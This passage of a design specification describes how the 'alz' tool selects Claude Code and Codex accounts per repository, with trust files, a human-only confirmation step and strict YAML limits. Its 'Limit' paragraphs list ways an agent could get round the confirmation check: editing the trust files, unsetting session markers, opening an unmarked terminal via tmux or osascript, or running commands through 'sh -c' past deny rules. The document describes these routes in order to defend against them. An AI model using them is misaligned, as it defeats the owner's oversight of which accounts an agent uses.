  but the owner sees the `build` warning and fails `check`; they pass `--skip-identity` (§10).

### 7.13 Account selection
*Planned: TASK-50, decision-15 as amended by decision-16 (the owner's decisions recorded in
TASK-50.1), decision-17 (recorded in TASK-50.7), decision-19 (the root walk, TASK-50.10) and
decision-20 (the writer of `allowed.yaml`, TASK-50.11).
Built so far (TASK-50.8, TASK-50.9, TASK-50.10, TASK-50.11): the `account` field and its name
rule, who may declare it, the refusal of layers that set the account variables (§7.9), the
cache reader and the cache index, the resolver with `alz account which`: the user config and
the allow state as files that are read, the resolution order, the root walk, the environment
source and failing closed, and `alz account allow` with `--remove` and the hint that `alz build`
and `alz check` print. Each other part is not built yet and names the task that builds it:
`alz run` (TASK-50.3), `alz use` and the shell hook (TASK-50.6), `alz doctor` (TASK-50.4) and
`alz account init` (TASK-50.5). The tool facts it relies on are recorded in `docs/target-facts.md` §12 (§12 items 10 to 21
here).*

Claude Code and Codex keep logins, workspace trust and per-user state in an account folder
that an environment variable chooses. alz can choose that folder per repository, so a
client's repositories start on the account that client expects. It is **off by default**: with
no layer declaration and no user config, alz sets no variable, prints nothing about accounts,
and every tool starts on its default account as it does today. alz never reads, copies or
prints a login and never opens a file inside an account folder; §9.1 lists the only
operations it performs there.

A layer names the account for every target, or per target:

```yaml
account: client-a              # every target
```

```yaml
account:                       # per target; a target left out is not decided by this layer
  claude: client-a
  codex: client-a-api
```

- **Account names** (built, TASK-50.8). A name matches `^[a-z0-9][a-z0-9-]*$` and has at most 64
  characters, and the map's keys are target names (§8). Anything else in the field, such as a path or a secret, is a schema error from
  `layer.yaml` parsing and `alz lint`, because the name becomes part of a folder path and of
  the shell hook's output. `default` always means the default account (built, TASK-50.10),
  and an account name that alz reads from `accounts.yaml`, from `allowed.yaml` or from
  `alz account which --use` must match the same rule, or it is ignored with a warning (the
  option is refused). A value that breaks the name rule never appears in a warning, so it is
  never repeated. A name that `alz run --account` or `alz use` passes is checked the same
  way: one that is not an account name fails closed (below) for that target, so `alz run` and
  `alz use` stop and it never falls to a lower step, and alz never builds a path from it.
- **Folders per target** (TASK-50.2, TASK-50.3). Each target adapter (§8) defines its variable
  and its folders, and alz sets only these variables. Account selection for Codex only sets
  `CODEX_HOME`, so it needs none of the rest of the Codex adapter (§8.2). The facts behind
  this table are §12 items 10 to 18:

  | Target | Variable | Default account | Named account `<name>` |
  |---|---|---|---|
  | `claude` | `CLAUDE_CONFIG_DIR` | variable unset: `~/.claude` plus `~/.claude.json` | `~/.claude-<name>`, with its own `.claude.json` inside |
  | `codex` | `CODEX_HOME` | variable unset: `~/.codex` | `~/.codex-<name>` |

  The default account is always the variable unset, and it never fails, even when its
  folder does not exist yet. alz unsets the variable for it and never exports the default
  folder's path: Claude treats `CLAUDE_CONFIG_DIR=~/.claude` as a different account, with
  `.claude.json` and the login keyed to that folder, while Codex treats an empty `CODEX_HOME`
  as unset and resolves a set one to its real path (§12 items 10 and 11). Neither tool falls
  back to the default folder when the variable is set (§12 item 13).
- **Who may declare it** (built, TASK-50.8; the run-time handling is built in the resolver and
  `alz account which`, TASK-50.10, and `alz run` and the hook will call the same resolver).
  The same two layers as `commit_identity`, with the same
  test for "outside the repository" and the same build errors (§7.12): the first stack entry,
  or one private or confidential `kind: client` layer outside the repository. The client
  layer's value replaces the first layer's whole value, a per-target map included; the two
  are never mixed. A declaration by any other layer is a build
  error that names the layers (and `alz init` prints it as a warning, §10), and, once built,
  `alz run`, the shell hook and `alz account which` ignore it and print one warning (the
  resolver reports it once, whatever the number of targets). When
  two client layers declare, neither applies: the build fails, and resolution reports a
  conflict (the cache reader's `conflict` status, TASK-50.9) and applies no declaration. A
  declaration by a layer inside the repository, the first layer included, fails the build
  but never decides anything in resolution: it is only reported as ignored, so it can neither
  win nor create a conflict, and editing `.layer/` never blocks the account (decision-18).
  `alz lint` of a single layer checks the shape only. In the hub repo itself (§4.4)
  `layer/` is inside the repository and cannot declare, so hub sessions get their account
  from the user config's `folders`.
- **Layers cannot set the variables** (built, TASK-50.8). No layer may set an account variable, or
  the variables that locate the account folders, alz's own files and the layer cache, through
  declarative configuration: environment settings, MCP environments, agent frontmatter and
  passthrough files (§7.9 lists every form). Items that run code, such as hooks and MCP
  commands, are outside this rule; the allow step is the control for those (§7.9 'Limit').
- **User config** (built, TASK-50.10). The owner's override lives in
  `${XDG_CONFIG_HOME:-~/.config}/agent-layerz/accounts.yaml`. It is written by hand: alz reads
  it and never writes or rewrites it. It is machine-local, outside every repository, never
  committed and never generated. Account names in it follow the same rule:

  ```yaml
  default_name: personal           # what the default account is called on this machine
  folders:                         # a folder and everything below it → an account
    ~/work/client-a: client-a
    ~/work/client-b:
      claude: client-b
      codex: default
  ```

  `default_name` is the name the default account goes by on this machine: a layer or
  `--account` that names it gets the default account, as `default` always does. alz warns
  when `~/.claude-<default_name>` or `~/.codex-<default_name>` exists, because that folder
  can then never be chosen. Paths are absolute or start with `~/`.
  - The top level must be a mapping, or the whole file is ignored with a warning. An unknown
    key, a `default_name` that is not an account name, and a `folders` entry whose key is not an
    absolute path or `~/...`, or whose value is not an account name or a map of target to name
    (`default` allowed), are each ignored with one warning; the key is printed only through
    quoting. A key that names an account folder as written is ignored before any file system
    call. A key that does not resolve matches nothing, silently. Two keys that resolve to the
    same directory with different values are both ignored, with a warning.
  - The entry that applies is the one with the longest real path that is the working directory
    or one of its parents. If it names no account for a target, that target skips the user config
    step; a shorter entry is not tried.
  - A warning about the shape of this file or one of its entries has the code `account-config`
    (§10.1).
- **Allow state** (built, TASK-50.10 and TASK-50.11; decision-16, decision-20). Approvals live in
  `${XDG_STATE_HOME:-~/.local/state}/agent-layerz/allowed.yaml`, a file only
  `alz account allow` writes. It holds one entry per repository root, sorted by root (name
  order, §6):

  ```yaml
  # written by alz account allow; deleting the file withdraws every approval
  - root: /home/you/work/client-c/api    # real path of the repository root
    account:                             # the accepted account per target
      claude: client-c
      codex: client-c
    source: /home/you/work/client-c/hub/layer  # local layer's real path, or URL without ref
  ```

  On read, the top level is a list (an empty file is an empty list), or the file is ignored
  with a warning. Each entry is a map with exactly `root` (an absolute path), `account` (a
  non-empty map of target to account name) and `source` (a non-empty text). An entry that is
  anything else, such as one whose `root` is not absolute or whose account names break the name
  rule, is ignored with a warning that holds only its position. A `root` that is not its own
  real path (a link, or another spelling) is ignored, because `alz account allow` records the
  real path. A `root` that lies inside an account folder, or is `$HOME` or above it, is ignored
  (as written, before any file system call, and again once it is real); one that only contains
  a folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names is kept, so that the repository fails
  closed (below). A `root` that does not resolve matches nothing. Two entries with the same real root are both ignored, with a warning, so
  that root is not allowed (one warning names both positions).
  - A warning about the shape of this file or one of its entries has the code `account-allowed`
    (§10.1).
- **Both files** (built, TASK-50.10; writing `allowed.yaml`, TASK-50.11, decision-20). alz ignores
  `accounts.yaml` or `allowed.yaml`, with a warning, when its real path is inside the current
  repository, when the user does not own it, when group or others can write it or its
  directory or any parent directory below `$HOME`, when its directory or one of those parents
  is not owned by the user (root is accepted for a directory outside `$HOME`; the directory of
  the file as located and the directory of its real path, when the file is a link, are both
  checked), or
  when the `XDG_*` variable that locates it points somewhere other than its default
  (`~/.config` or `~/.local/state`, compared as real paths) while `__MISE_DIFF` or
  `DIRENV_DIFF` exists. alz cannot tell whether mise or direnv set that variable for a
  repository, because it only checks that their variables exist and never reads them
  (decision-17, "Values set outside alz" below). The warning names the `XDG_*` variable and
  says that mise or direnv is active here. alz also ignores `allowed.yaml`, with a warning,
  when its real path, or its path as located (a link placed inside a work tree), lies inside
  any git work tree, found by `lstat` of `.git` in each directory above it (no git runs); the
  warning names the `.git` that was found. A checkout could have planted the file, and the mise
  and direnv check above does not cover a shim-only mise (§12 item 20, unverified).
  `accounts.yaml` in a work tree only gets a warning, and is still read. Only a git checkout (a
  `.git` folder or file) is detected: an archive, a jj repository without git, Mercurial, Sapling
  and a bare repository used for dotfiles are not, so none of them is refused. A `~/.git` makes
  every `allowed.yaml` below it ignored, and so withdraws every approval.
  - An `XDG_*` value that is empty or not an absolute path counts as unset, as the XDG Base
    Directory specification says; a relative value also gets a warning.
  - Both files may be links: each is read at its real path, as a regular file of at most
    1 MiB, with the YAML alias limit, and the folder of the link and the folder of its target
    are both checked. A file that is not valid YAML, or that is not a regular file of that
    size, is ignored with a warning.
  - A platform where the user id cannot be read, and a path that names an account folder as
    written, mean the file is ignored, before any file system call on it. A `$HOME` that is not
    an absolute path ignores both files with one warning and sets no account folder: a named
    account from `alz run` or `alz use` then fails closed, and every other target keeps the
    default account.
  - The two `XDG_*` checks above come before the existence check, so a lookup that mise or
    direnv moved to a folder that does not exist is still reported with the warning that names
    the variable, not as "not found".
  - A file that does not exist is not a problem: step 3 or step 4 is skipped, and
    `alz account which` says "not found".

  `alz account which` prints the paths of both files. `alz account allow` and `--remove` are the
  only code that writes `allowed.yaml` (decision-20):
  - It holds an exclusive lock file `allowed.yaml.lock` (named after the real file for a link), next to the file that is replaced,
    while it reads and writes. The lock file is created with `O_CREAT|O_EXCL|O_NOFOLLOW` and
    mode `0600`; a lock that exists is polled every 50 ms for up to 10 seconds, then the
    command refuses, names the lock file and says to delete it if no `alz account allow` is
    running. alz never removes a lock it did not create, and never follows a lock that is a
    link.
  - Under the lock it reads the file again with the reader above. It refuses, and changes
    nothing, in every state the reader ignores (for the file, its directory or `XDG_STATE_HOME`
    as mise or direnv may have moved it), for a dangling link or anything that is not a regular
    file, and for a file that holds an entry the reader ignores (a bad shape, a relative root,
    an invalid name, a root that is not its real path, two entries for one root): it names
    their positions only and says to fix or delete the file. alz never repairs: no `chmod` of
    an existing file or directory, no dropped entry, no removed stale lock.
  - It keeps the entries sorted by root and replaces the entry for the same real root. Entries
    that are valid but whose root does not resolve are kept. It writes the file at its real
    path (a link is kept), through a temporary file `.allowed.yaml.<pid>-<8 hex>.tmp` (named after the real file for a link) in the same
    directory (`O_EXCL|O_NOFOLLOW`, mode `0600` whatever the umask, flushed) and a rename. Missing
    directories are created with mode `0700` and an existing directory keeps its mode and must
    pass the checks above. A result over 1 MiB, one that does not parse back to the same
    entries, or one that the reader does not read back as written is an error. After the last
    `--remove` the file holds `[]`.
  - Every path it writes is built from `$HOME`, `XDG_STATE_HOME` and fixed names, never from
    repository text. It never lies inside the repository, an account folder or a git work tree
    or, for a linked `allowed.yaml`, the directory of its real path, which passes the same
    checks. Missing parent folders are created with mode `0700`, and only after the place is
    known to be safe.
  - A link, or a link in a folder above the file (its real path differs from where it is looked
    for), is followed only to a file that is empty, holds `[]`, or starts with the header alz
    writes (`# written by alz account allow; …`); any other target may be somebody else's file,
    and the command refuses and changes nothing, before it asks anything and again under the
    lock. The target is checked once more just before the rename and refused if it is no longer
    the file that was read.
- **Trust and `alz account allow`** (built: the resolution side, TASK-50.10; `alz account
  allow`, `--remove` and the build and check hints, TASK-50.11; decision-16). The repo manifest is repository
  content and chooses the stack, so a cloned repository can name an external layer that names
  one of your accounts: the weakness §7.12 "Trust" describes for the commit identity. The
  session would then run with that account's logins and MCP connections. So an account named
  by a layer applies only after `alz account allow` in that repository:
  - `allow` reads the stack the way resolution does for an allowed repository (below), with
    the same function, so it accepts exactly what resolution will apply. On a cache miss it
    changes nothing and says to run `alz build`; when several client layers declare, it says to
    remove one declaration and run `alz build`; when the layers name no account, it says so
    (and names `alz account allow --remove` when this root has an entry); a declaration of the
    reserved name `alz-blocked` is refused. A declaration made inside the repository is never
    offered: it is printed as a warning, as `alz account which` does.
  - It checks that a person is at a terminal before any file system call: it refuses and
    changes nothing when standard input is not a terminal or when it runs inside an agent
    session (any agent-session marker below is set, even to an empty value). It names every
    reason that applies and the markers by name, never by value, and for `CLAUDECODE` adds
    that Claude Code also sets it in an IDE's integrated terminal. There is no `--yes`, `-y`
    or any other way to answer: they are usage errors (exit 2). Only `src/cli/terminal.ts`
    reads standard input.
  - Before it asks, it checks that `allowed.yaml` can be written (the states above) and
    refuses without a prompt otherwise; an entry equal to the current declaration for this
    root prints `already allowed` and exits 0 without a prompt or a write.
  - It prints the repository, the account per target and whether its account folder exists (by
    name only, §9.1; a target the layers leave out is said so), the declaring layer and its
    position in the stack, its source and `ref` as written, its revision (the commit in
    `layer.lock`, or none for an unpinned `path:` layer), the source that will be recorded,
    and the entry that is allowed now when it differs. Everything that comes from the
    repository is quoted, with every character other than printable ASCII shown as `\u{XXXX}`
    (account names, which are validated, are unchanged); the prompt repeats the root and the
    source, because the details go to standard output and the prompt to standard error. It then asks the person to confirm by typing the account name (not
    `y` or `n`): one prompt for each distinct account name, in target order, and each answer
    without its surrounding spaces and tabs must equal the name. Anything else, the end of
    input or Ctrl-C ends with `not confirmed; nothing changed` and exit 1. The answer is never
    printed. After the last answer it reads the declaration again and refuses if the map,
    the recorded source, the revision or the layer is not what was shown.
  - It records the repository's real root, the accepted per-target map (with the targets it
    leaves out) and the declaring layer's source: the remote URL without its ref, or the real
    path of a local layer. Step 4 of the resolution applies only while the resolved map and
    the source both equal the recorded ones; any difference, including a target added to or
    removed from the map, skips step 4 for every target. A ref bump needs no new approval,
    because the account is what is approved, not the layer's revision.
  - `alz account allow --remove` removes this repository root's entry, under the same lock
    file. It has the same terminal and agent-session checks, because without an entry the
    repository goes back to the default account, and asks for the recorded account names the
    way `allow` does. It does not read the stack, so it works on a cache miss, with an
    unreadable `layer.yaml` and after the declaration is gone. With no file or no entry for
    this root it prints `nothing to remove`, exits 0 and creates nothing. Deleting
    `allowed.yaml` removes every entry.
  - `alz build` and `alz check`, which read the stack anyway, print the `alz account allow`
    command when a layer names an account in a repository that is not allowed, or when an
    allowed entry has changed (then with the old and new values). They print it as a
    `note [account-allow]` line on standard error, only when standard input is a terminal and
    no agent-session marker is set; neither standard output nor any generated file changes.
    `alz check` prints it only when its own comparison passed, whatever the identity result,
    because otherwise `allow` would find a cache miss. Other forms: `alz account allow
    --remove` when the layers no longer declare and this root has an entry; the reason (`allowed.yaml` is ignored, is not a list, or has an ignored entry, with its
    positions only), then `then run: alz account allow`; only the miss reason on a cache miss,
    and only when the merged configuration names an account. No hint is printed for a root at or above `$HOME`, inside an account
    folder or inside a folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names, where resolution never
    applies an account. `alz account which` prints the command only when an allowed entry has
    changed; for a repository that is not allowed yet, it reports only that step 4 was skipped.
    The shell hook and `alz run` never print it for a repository that is not allowed yet; `alz
    run` names `alz account allow` only as the fix when it fails closed on a changed
    declaration or source (§10).
  - Accounts set in the user config need no approval, because the owner wrote them.
  - **Agent-session markers** (§12 item 19). A process counts as inside an agent session when
    any of `CLAUDECODE`, `CLAUDE_CODE_CHILD_SESSION`, `AI_AGENT`, `CODEX_THREAD_ID`,
    `CODEX_SESSION_ID` or `CODEX_CI` is set, even to an empty value. Claude sets the first
    three in its shell commands and hooks, and `CLAUDECODE` in its stdio MCP servers. Codex
    sets `CODEX_THREAD_ID` and `CODEX_SESSION_ID` in its shell commands and `CODEX_CI` in
    unified-exec ones; those are read from its source and not yet observed (owner check O5 in
    `docs/target-facts.md` §12.2, a release gate: the Codex part is not shipped as verified
    until the owner has run it). Only Claude Code and Codex sessions are detected; a session
    of any other agent sets none of these names and looks like a person. Claude also sets `CLAUDECODE` in an IDE's integrated
    terminal, so `alz account allow` refuses there too: the person runs it in a terminal
    window outside the IDE. Codex sets no marker in its stdio MCP servers, so there only the
    terminal check applies. A marker proves a session, but its absence proves nothing,
    because any process can unset these variables (Limit, below).
  - **Limit.** alz runs as the user, so an agent that can write outside the repository can
    edit `accounts.yaml` or `allowed.yaml` itself, and a process it starts can unset the
    session markers; the terminal and session checks only stop it from running
    `alz account allow` directly. The real protection is a sandbox that limits the agent's
    writes to the working directory, with `allowed.yaml` kept outside every repository. The
    personal layer should also hold deny rules, which no more specific layer can remove
    (§7.6), for `read:`, `write:` and `edit:` on `~/.config/agent-layerz/**` and
    `~/.local/state/agent-layerz/**`, and for `bash:alz account allow*`. These rules only slow
    an agent down; they are not a guard (§12 item 21). Nor does a sandbox that confines writes
    stop an agent from asking a program outside it to open a real terminal: `tmux` (a socket
    it can reach), `open` (LaunchServices) and `osascript` can start a terminal window that is
    not marked and has a TTY. Whether the Claude and Codex sandboxes block these is owner check
    O8 (`docs/target-facts.md` §12.2); until it is run, the terminal check is a speed bump. Claude's documentation says a Bash rule
    is not a security boundary, and `sh -c '…'`, a full path or a script runs the same
    command past it. Its Read and Edit denies stop the file tools and simple shell reads and
    writes, but reach every shell command only together with the sandbox's
    `filesystem.denyRead` and `denyWrite`. Codex accepts `~/` paths in its deny-read patterns;
    how far its rules reach is owner check O6.
  - **Limit.** The checks on the two files and their folders are best effort. They do not
    cover `$HOME` itself (its owner and mode are not checked; only the directories below it
    on the way to the file are), parents of a directory outside `$HOME`, the targets of a
    chain of links after the first hop (only the folder of the link and the folder of its final
    real path are checked), or access control lists. An `allowed.yaml` entry records a real
    root, so whoever can write the parent of that root can plant a directory there that
    resolves to the same real path as another checkout; that needs write access to the parent,
    which the entry does not guard against. Both accepted: they need the same access as editing
    the files.
  - **Limit.** An allowed repository ends on the default account, with a warning each time,
    when alz cannot trust `allowed.yaml`: the file is ignored because it lies inside the
    repository, inside a git work tree or inside an account folder (a folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names, at
    or above the file, included), is not owned by you, can be written by group or others (or its folder or a
    parent below `$HOME` can), cannot be read as a regular file of at most 1 MiB, is not valid
    YAML, or the platform has no user id; `XDG_STATE_HOME` points away from `~/.local/state`
    while mise or direnv is active; or `$HOME` is not an absolute path. A repository
    whose entry is not its real path, or whose root lies at or above `$HOME` or inside an
    account folder by name, is not allowed either. The default account is the safe outcome for
    a repository that is not allowed, but it is a different account from the one the person
    approved, so these cases are visible only in the warning.
- **Resolution** (built as a resolver and `alz account which`, TASK-50.10; `alz run`,
  TASK-50.3, and `alz use` with the hook, TASK-50.6, call the same resolver), for each target,
  first match wins:
  1. `alz run <tool> --account <name>`, for that run only;
  2. `alz use <tool> --account <name>`, for the current terminal until
     `alz use <tool> --reset`;
  3. the user config's `folders` entry for the working directory: the longest path that is
     the directory itself or one of its parents;
  4. the layer declaration, if allowed (above) and readable without a fetch (below);
  5. the default account.

  A step that names no account for this target is skipped. `alz account which` prints the
  account per target and its source: `use`, `environment` (a value set outside alz, see
  below), `user config`, `layer` or `default`, with the reason for every skipped step.
- **Paths** (built, TASK-50.10; decision-19). The repository root is the nearest directory at
  or above the working directory whose `layer.yaml` has a `stack` key (§5.2); a `layer.yaml`
  without one, such as a layer's own manifest (§5.1), is skipped and the walk goes on. Each
  `layer.yaml` read on the way is parsed only up to 1 MiB and with a limit on YAML aliases.
  - A `layer.yaml` on the way that cannot be used stops the walk: a link, a folder, a file
    over 1 MiB or one that cannot be read, invalid YAML, a file past the alias limit, or a
    stack that does not pass the schema. That directory is the root, with one warning that
    names the file and says why; the walk never goes on past it, so a nested checkout with a
    broken manifest never gets the outer repository's account. If that root is in `allowed`
    the hook applies the blocked folder (alz cannot tell that the recorded source is still in
    the stack) and the fix is to repair the file; otherwise the default account applies.
  - The walk never opens a `layer.yaml` at `$HOME`, above it or in an account folder: it
    stops there with no repository (reported as "no repository here" at or above `$HOME`, and
    as inside an account folder below one), and a working directory that names an account
    folder as written is refused before any file system call. The working directory is
    resolved once and nothing resolves it again, and the user config step is skipped for a
    working directory in an account folder.
  - A working directory inside a folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names, but not
    under `~/.claude*` or `~/.codex*`, finds no root and opens nothing there. If `allowed.yaml`
    holds an entry whose real root is the working directory or one of its parents, every
    target that entry names fails closed on the blocked folder (`alz account which` says so and
    that the layers are not read); with no such entry the default account applies. The user
    config step still applies.
  - A directory that only contains a folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names (for
    example a repository with such a folder inside it) stays a root; step 4 for it is a cache
    miss (`account-folder`), so an allowed repository fails closed on the recorded account and
    one that is not allowed gets the default account, never an outer repository's.
  - `layer.yaml` and the two files are opened without following a link and without waiting for
    a writer, so a FIFO put in their place is refused instead of hanging the prompt. Paths are resolved to
  real paths using the file system's own spelling of each name, as in §7.12. A `folders`
  entry matches whole path segments, so `~/work/client-a` does not match `~/work/client-ab`.
  An `allowed` entry matches only the exact real root of the repository whose manifest is
  being resolved, so a nested repository needs its own entry. An entry whose path does not
  resolve matches nothing.
- **No fetch on resolve** (built, TASK-50.9 and TASK-50.10; the commands that call it are
  `alz account which`, `alz run` (TASK-50.3) and the hook (TASK-50.6)). Resolution (the shell hook, `alz run`, `alz account which`) never
  fetches, clones or runs git, and writes nothing. If the repository root is not in `allowed`,
  step 4 is skipped without reading the stack. If it is, resolution reads each layer's
  `layer.yaml` with the same validation as `build`. A layer under the repository root as
  written is inside. For any other `path:` layer or local `git:` source, whether it is inside is
  decided from its real path, and one that does not resolve is a cache miss
  (`layer-directory-missing`), never a layer to skip. The real path is found one component at a
  time, as §6 "Layers in or around an account folder" says: each resolved prefix is checked
  before the next component is looked at, so no name inside an account folder is `lstat`ed,
  read as a link or opened, even through a link planted in the repository. The TypeScript
  `alz` computes the real path with `realpath` and checks it afterwards. A planted link
  therefore makes it `lstat` and `readlink` names inside an account folder before it refuses,
  though it opens nothing there (reference drift, TASK-52). It reads from:
  - a `github:` or `git:` layer outside the repository: its cache entry for the commit the
    lock pins;
  - a `path:` layer outside the repository with a `ref`: the cache entry named by the cache
    index. Next to each `tree2@<tree>` entry (§6), every command that resolves a pinned
    `path:` layer (`build` and the other commands in §5.3) writes an index entry keyed by the
    layer directory's real path and the commit SHA, for example
    `pathref@<sha256 of the real path>-<sha>`, whose whole content is the tree id (lowercase,
    no newline). It is written through a temporary file and a rename, rewritten when it
    differs, and never removed. `build` and resolution compute the real path with the same
    function, and resolution computes it from the manifest without git and reads only the
    index entry for that path, so a repository cannot select another source's entry. The
    lock entry must record the manifest's ref (its `rev`), otherwise the lock is for another
    ref and the layer is a miss until `alz build` runs (`lock-ref-mismatch`). An
    index entry is written only for a tree that git lists as a directory at that path (§6),
    never for a link or submodule entry, so the index never names a tree that the layer's own
    repository does not hold at that path. The entry is used only when `lstat` shows a regular
    file whose whole content is 40 or 64 hexadecimal characters, as long as the commit's id;
  - a `path:` layer without a `ref` outside the repository: the layer in place. Its content
    hash is checked (below), so an edit since the last `alz build` is a miss;
  - a layer inside the repository (§7.12), whatever its source, is read only to warn when it
    declares an account, which it may not. Only its `layer.yaml` is read, in place, as a
    regular file of at most 1 MiB with the YAML alias limit. It is never checked against the
    lock, and a `layer.yaml` that cannot be read or parsed is skipped, so editing `.layer/`
    never changes or blocks the account. A `git:` layer inside the repository is not read.

  A lock `sha` is used only when it is 40 or 64 lowercase hexadecimal characters and the lock
  has exactly one entry for the source. Resolution checks each layer outside the repository
  against the lock's content hash (§5.3), which covers every file of the layer, with
  `verifyCachedLayer`, before `layer.yaml` is parsed, and a mismatch counts as a cache miss.
  Each file is read once, never through a link, and the bytes hashed are the bytes parsed. It is
  opened relative to the folder that holds it, and its type and size are checked with `fstat`
  on the handle that is read (decision-27), so a name swapped between two calls cannot change
  what was checked. A
  layer with more than 2000 entries, or more than 16 MiB in all, is a cache miss
  (`unreadable`); `alz build` has no such limit in all. A file of more than 16 MiB is
  unreadable in both (`unreadable`; in the build, the error `layer` of §5.3 "File names" that
  says a file cannot be read). The entries are the names the walk lists in
  the layer directory and in each folder below it: files, folders, links, other entries and
  `.env` files all count, while the skipped names (`.git`, `.DS_Store`, `node_modules`, §5.3),
  everything below them and the layer directory itself do not. The walk stops at entry 2001.
  The 16 MiB are the sizes of the files that are read, so `.env` files and links add nothing.
  The stack validation (§6 step 2) covers only
  the layers outside the repository, so editing `.layer/` cannot make it fail.
  A repository root, cache or layer directory that lies inside an account folder, or contains
  one (`$HOME` or above it, or the folder `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names), is a
  cache miss, and nothing in it is opened (§9.1). A working directory inside a folder that
  `CLAUDE_CONFIG_DIR` or `CODEX_HOME` names (mise or direnv can point it at a repository or at a
  parent of one) is the one case where the repository root is not found, because nothing in
  that folder is opened, so no manifest is read there: resolution checks `allowed.yaml` only,
  and an entry whose real root is the working directory or one of its parents fails closed on
  the blocked folder for that entry's targets (the "Paths" rule above). A source path that names one as written
  (`~/.claude-x`, a case variant, a `file://` URL) is a miss before any file system call on it,
  and the canonical clone path of a local `git:` source is checked too. A `git:` source with a
  `..` segment in its URL is a miss (`source-invalid`), because the operating system could resolve
  it through a link. A cache directory inside the repository is a miss (`cache-in-repo`).
  A cache that `XDG_CACHE_HOME` locates away from `~/.cache` (compared as real paths) while
  `__MISE_DIFF` or `DIRENV_DIFF` exists is not trusted for the same reason as the two files
  above: resolution reads no layer and the layer step is a cache miss (`cache-location`). An
  empty or relative `XDG_CACHE_HOME` counts as unset. The reader reports `conflict` as a
  status of its own, so that no caller can read it as "no declaration". Anything else above that cannot be verified
  is a cache miss too, and a cache miss skips step 4 and fails closed (below). The lock does
  not change. The cache keys of git sources are unambiguous (§6), so a repository cannot make
  resolution read another source's entry by naming a similar URL.
- **YAML limits** (TASK-65; decision-28). Every YAML file alz reads, in every command, is read
  as strict UTF-8 and capped at 1 MiB, and parsed with the YAML alias limit. That covers
  `layer.yaml`, every frontmatter block (the 1 MiB counts the whole file that holds it), a
  layer's settings files, `accounts.yaml` and `allowed.yaml`. A file past any limit counts as
  invalid YAML. The YAML alias limit is five budgets:
  - at most 100 aliases (`*name`) in a document, counted as they are written in the text, not
    as they expand;
  - at most 64 mappings and sequences nested inside one another: a document that is one scalar
    has none, and `a: [x]` has two. Depth is counted in the tree as aliases expand it, so an
    alias at depth d of a node h levels deep reaches d + h;
  - at most 20000 nodes (scalars, aliases, mappings and sequences) in a document;
  - at most 10000 parse events replayed through aliases. Each scalar, each alias and the start
    and end of each mapping or sequence is one event, so each use of an alias of a large node
    costs that node's size. An alias inside that node costs one event plus the size of its own
    anchor's node, each time the outer node is replayed;
  - at most 4 MiB (4194304 bytes) of scalar text in a document, counting a scalar again each time
    an alias replays it. A file is at most 1 MiB, so scalars as written never reach the budget;
    aliases of large scalars do (a 100 KiB scalar used by 41 aliases). It bounds the memory of the
    parsed tree. The error is `yaml` with the message `more than 4 MiB of scalar text, counting
    each alias use again`.

  decision-28 names the serde-saphyr options, not how they count. R2 (TASK-55.3) sets them so
  that these five hold and tests each boundary.

  The TypeScript `alz` differs (reference drift, TASK-62):
  - it caps only some of these files at 1 MiB and reads invalid UTF-8 as U+FFFD;
  - it has no depth, node or replay budget;
  - it uses the `yaml` library's `maxAliasCount: 100`, which counts per anchor. An anchor's
    count starts at 1 and each alias to it adds 1, and the document is refused once count ×
    weight passes 100. The weight of a scalar is 1, of a mapping or sequence the largest weight
    among its items (0 when it is empty), and of an alias the count × weight of its anchor. So
    it refuses the 100th use of an anchor on plain text, never limits the uses of an anchor on
    an empty mapping or sequence, and accepts 51 uses of one anchor and 50 of another.
- **What else makes a YAML file invalid** (TASK-55.3; decision-28 as amended on 2026-11-23). The
  scope is the same as for the limits above:
  - **Control characters.** The file's text may hold tab, line feed and carriage return, since YAML
    reads CR and CRLF as line breaks. Any other character of U+0000 to U+001F, U+007F to U+009F
    (NEL, U+0085, included), U+2028 or U+2029 is an error. After YAML has applied its escapes and
    normalised its line breaks, every key and value may hold only tab and line feed, so an escape
    such as `"\x07"`, `"\e"`, `"\r"` or `"\u2028"` is an error as well. Format characters
    (category Cf) are a rule of the individual field, not of YAML, because emoji sequences use
    U+200D (§7.12).
  - **Tags.** An explicit tag outside the YAML 1.2 core set (`!!str`, `!!int`, `!!float`, `!!bool`,
    `!!null`, `!!map`, `!!seq`) is the error `yaml-tag`. That covers `!!binary`, `!!timestamp`,
    `!!set`, `!!omap`, `!!merge`, `!!value`, local tags such as `!foo` and other global tags such
    as `!!python/object`. Nothing is decoded or dropped silently.
  - **Documents.** A file with more than one document is an error.
  - **Aliases.** An alias whose anchor is not defined before it (unresolved), and an alias inside
    the node its own anchor names (cyclic, as in `&a [*a]`), are errors.
  - **Keys.** Two equal keys in one mapping are an error.
  - **Types.** Where a field expects text, a number is an error that suggests quoting the value.
    Where it expects a whole number, a float without a fractional part counts as one (§5.1, §5.2).
  - **Errors.** Each of these, and each limit above, is the error `yaml` (a tag: `yaml-tag`) at
    `<where>:<line>:<column>` (§10.1), with a message that names the kind of problem only. It never
    quotes the file: no scalar, no anchor or alias name, no tag. The one exception is a duplicate
    key, printed as a quoted key (§10.1).

  The TypeScript `alz` differs (reference drift):
  - it puts the name of an unresolved alias into its error (TASK-59);
  - it accepts a cyclic alias, and has no depth limit, so deep nesting fails by stack overflow
    somewhere between 200 and 1000 levels (TASK-60);
  - it decodes `!!binary` into bytes and `!!timestamp`, `!!set` and `!!omap` into a date, a set and
    a map, and it reads `!foo` and `!!python/object` as plain text, with a Node warning on
    standard error that quotes the input line (TASK-55.3);
  - it accepts control characters in the file and in decoded strings (TASK-55.3);
  - its messages are the `yaml` library's text.

  More than one document is an error in both.
- **Environment** (TASK-65). Resolution reads the values of exactly these variables, by name:
  `HOME`, `CLAUDE_CONFIG_DIR`, `CODEX_HOME`, `ALZ_SET_CLAUDE_CONFIG_DIR`, `ALZ_SET_CODEX_HOME`,
  `XDG_CONFIG_HOME`, `XDG_STATE_HOME` and `XDG_CACHE_HOME`. Of `__MISE_DIFF` and `DIRENV_DIFF`
  it checks only that they exist ("Values set outside alz"). No other variable changes the
  account it resolves or what it prints: not `ALZ_USE_<TARGET>` ("`alz use` stays in the
  shell"), not the agent-session markers, and not `GIT_*`, since resolution runs no git. A set
  `HOME` is used as given, so an empty or relative one is not an absolute path (above). An
  unset `HOME` is the home directory that the user database records for the effective user id
